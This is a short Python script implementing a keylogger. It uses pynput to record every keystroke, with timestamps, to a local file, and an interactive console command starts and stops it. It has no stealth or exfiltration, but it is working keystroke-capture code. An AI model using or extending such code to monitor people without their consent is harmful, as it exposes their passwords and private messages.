from pynput import keyboard
import logging
import threading

log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

running = False
listener = None

def on_press(key):
    try:
        if key == keyboard.Key.space:
            logging.info("[SPACE]")
        elif key == keyboard.Key.enter:
            logging.info("[ENTER]\n")
        elif key == keyboard.Key.backspace:
            logging.info("[BACKSPACE]")
        elif key == keyboard.Key.shift:
            logging.info("[SHIFT]")
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            logging.info("[CTRL]")
        elif key == keyboard.Key.esc:
            logging.info("[ESC]")
        else:
            logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def start_keylogger():
    global running, listener
    if not running:
        running = True
        print("🔵 Keylogger started... Press 'stop' to stop logging.")
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    else:
        print("⚠️ Keylogger is already running!")

def stop_keylogger():
    global running, listener
    if running:
        running = False
        if listener:
            listener.stop()
        print("🔴 Keylogger stopped.")
    else:
        print("⚠️ Keylogger is not running!")

def main():
    while True:
        command = input("Enter command (start/stop/exit): ").strip().lower()
        if command == "start":
            start_keylogger()
        elif command == "stop":
            stop_keylogger()
        elif command == "exit":
            stop_keylogger()
            print("Exiting program.")
            break
        else:
            print("❌ Invalid command! Use 'start', 'stop', or 'exit'.")

if __name__ == "__main__":
    main()
